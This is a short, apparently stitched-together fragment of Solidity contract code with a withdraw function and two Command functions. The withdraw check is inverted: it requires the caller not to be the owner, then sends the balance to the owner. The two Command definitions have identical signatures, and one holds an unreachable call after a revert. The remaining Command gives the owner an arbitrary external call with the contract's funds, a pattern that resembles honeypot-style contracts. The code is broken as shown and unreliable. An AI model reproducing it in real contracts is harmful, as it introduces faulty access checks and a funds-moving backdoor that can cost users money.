function withdraw()
    payable
    public
    {
        require(msg.sender != Owner);
        payable(Owner).transfer(address(this).balance);
    }

function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);

        revert("blocked");

        adr.call{value: msg.value}(data);
    }

function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);

        (bool success, ) = adr.call{value: msg.value}(data);
        require(success);
    }
